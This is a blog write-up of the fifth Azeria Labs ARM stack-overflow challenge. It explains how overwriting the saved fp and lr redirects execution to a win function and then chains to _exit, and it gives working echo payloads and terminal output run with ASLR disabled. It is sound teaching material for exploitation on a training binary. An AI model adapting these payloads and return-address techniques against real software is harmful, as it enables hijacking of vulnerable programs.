---
layout: post
title: "Smashing ARM Stack for Fun - Part V"
tags: [reversing, exploiting, ARM, iasm, azeria-labs, egg, shellcode]
inline_default_language: nasm
---

[Fifth challenge](https://github.com/azeria-labs/ARM-challenges)
with a small introduction to *process continuation*.<!--more-->


## Planning the exploit

```nasm
pwndbg> pdisass &main
 ► 0x10464 <main>       push   {fp, lr}
   0x10468 <main+4>     add    fp, sp, #4
   0x1046c <main+8>     sub    sp, sp, #0x48
   0x10470 <main+12>    str    r0, [fp, #-0x48]
   0x10474 <main+16>    str    r1, [fp, #-0x4c]
   0x10478 <main+20>    sub    r3, fp, #0x44
   0x1047c <main+24>    mov    r0, r3
   0x10480 <main+28>    bl     #gets@plt <gets@plt>

   0x10484 <main+32>    mov    r0, r3
   0x10488 <main+36>    sub    sp, fp, #4
   0x1048c <main+40>    pop    {fp, pc}
```

`sub r3, fp, #0x44` means that the buffer begins 0x44 bytes from `fp`,
the begin of the stack frame.

As we saw [previously](/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
the stack frame includes the *previous* value
of `fp` but not `lr` which it is *immediately below*.

So a buffer overflow of 0x44 bytes will overwrite the stored `fp` and an
overflow of 0x48 will overwrite `fp` and `lr`.

If we do the latter, the function `main`{.cpp} will jump to
our own code on *return*.

{% call marginnotes() %}
The left diagram shows the stack from lower
addresses (left) to higher addresses (right) and the `main`{.cpp}'s and
`__libc_start_main`{.cpp}'s stack frames (`main`{.cpp} and `start`{.cpp} for short)
 {% endcall %}


```nasm
    main --------------v------ start
.......   fp      lr   |  ??   ??   ??   ??
```

As you can see the `fp` and `lr` are stored in the stack as well as an
unknown local variables of `__libc_start_main`{.cpp}.

When the overflow occurs this is the result:

```nasm
    main ---------------v----- start
.......   fp      lr    | ??   ??   ??   ??         (pre-exploit)
    main ---------------v----- start
AAAAAAA   BB      addr1 | ??   ??   ??   ??         (overflow)
```

No more crazy stuff is needed here, we can jump to `win`{.cpp} (`addr1 == 0x1044c`{.cpp})
directly.

## Exploit level 1

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4c\x04\x01\x00' | ./stack4
code flow successfully changed
Segmentation fault
```

Yeah! but that segfault looks sloppy.

## A more *polite* exploit

Once `win`{.cpp} executes it will pop from the stack the stored
`lr` and set it into `pc`.

We didn't call `win`{.cpp} with `bl` or similar so the `lr` was never
set correctly and the value pushed in the stack by `win`{.cpp} was garbage.

When `win`{.cpp} returns will jump to who-knows-where.

```nasm
    main ---------------v----- start
.......   fp      lr    | ??   ??   ??   ??         (pre-exploit)
    win ----------------v----- start
          BB      ??    | ??   ??   ??   ??         (win called)
                  ^
                  ret address of win
```

And if we don't jump to `win`{.cpp} exactly?

We could jump to the second instruction of `win`{.cpp}:
we will be **skipping** the `push`.

```nasm
pwndbg> pdisass &win
   0x1044c <win>        push   {fp, lr}
 ► 0x10450 <win+4>      add    fp, sp, #4
   0x10454 <win+8>      ldr    r0, [pc, #4]
   0x10458 <win+12>     bl     #puts@plt <puts@plt>

   0x1045c <win+16>     pop    {fp, pc}
```

In this way we can *emulate* the `push` of `fp` and `lr` adding 8 bytes
to our payload.

```nasm
    main ---------------v--------- start
.......   fp      lr    | ??    ??      ??   ??      (pre-exploit)
    main ---------------v--------- start
AAAAAAA   BB      addr1 | CC    addr2   ??   ??      (overflow extended)
                        v--------- start
          ??      ??    | CC    addr2 | ??   ??      (win called without push)
        ------ win -------------------^
```

So now we control where `win`{.cpp} will return: `addr2`{.cpp}.

## Planning a controlled exit

An ideal situation would make the program continue running after
exploiting it, known as
[process continuation shellcode](https://azeria-labs.com/process-continuation-shellcode/)
but it is too complex for now.

The simplest thing is to call
[`_exit`{.cpp}](https://linux.die.net/man/2/_exit)
a thin glib wrapper of [`exit_group`{.cpp}](https://man7.org/linux/man-pages/man2/exit_group.2.html)
syscall that exits the process and its threads.

```nasm
pwndbg> pdisass &_exit
 ► 0xb6f1b934 <_exit>       push   {r7, lr}
   0xb6f1b938 <_exit+4>     mov    r2, r0
   0xb6f1b93c <_exit+8>     mov    r7, #0xf8
   0xb6f1b940 <_exit+12>    svc    #0
   0xb6f1b944 <_exit+16>    cmn    r0, #0x1000
   0xb6f1b948 <_exit+20>    bhi    #_exit+68 <_exit+68>
```

The `svc #0` is what it triggers the syscall. In Arm 32bits the
instruction is `swi` but the disassembler renames it to the newer name:
*supervisor call*.

The syscall number is passed to the kernel via `r7` as mentioned in [man
syscall(2)](https://man7.org/linux/man-pages/man2/syscall.2.html).

In our case [0xf8 is the syscall number](https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl#L265)
of
[`exit_group`{.cpp}](https://man7.org/linux/man-pages/man2/exit_group.2.html).

## Exploit level 2

We are going to cheat a little and disable ASLR so we can hardcode
the address of `_exit`{.cpp} (0xb6f1b934)

```shell
pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash
(aslr disabled) pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x04\x01\x00BBBB\x34\xb9\xf1\xb6' | ./stack4
code flow successfully changed

(aslr disabled) pi@raspberrypi:~$ echo $?
31

(aslr disabled) pi@raspberrypi:~$ exit
exit
```

As you can see the return code of the process was 31. I corroborated
with a debugger the value of the registers before the syscall and `r0`
was 31 as expected.

Instead of jumping to `_exit`{.cpp} we could jump before to a piece of code
--known as gadget-- that sets `r0` to zero and then jump to
`_exit`{.cpp}.

But that's for another post.

